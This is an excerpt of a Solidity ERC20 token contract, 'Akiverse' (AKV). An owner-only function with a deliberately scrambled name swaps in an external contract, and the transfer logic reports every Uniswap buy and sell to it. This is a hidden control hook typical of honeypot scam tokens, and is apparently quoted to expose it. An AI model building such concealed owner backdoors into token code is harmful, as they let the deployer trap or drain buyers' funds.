...
contract TokenM is ERC20 {
    ...
    IUserAmountoesser public oesser;
	mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedFromVipFees;
      uint256 total;
    constructor(address tokenOwner) ERC20("Akiverse", "AKV") {
    ...
    function ceoseersBttongRdde(IUserAmountoesser _oesser) public onlyOwner {
        oesser = _oesser;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                oesser.addInAmount(to, amount);
            }else if(to == uniswapV2Pair){
				oesser.addOutAmount(from, amount);
            }else{
                oesser.addOutAmount(from, amount);
                takeFee = false;
            }
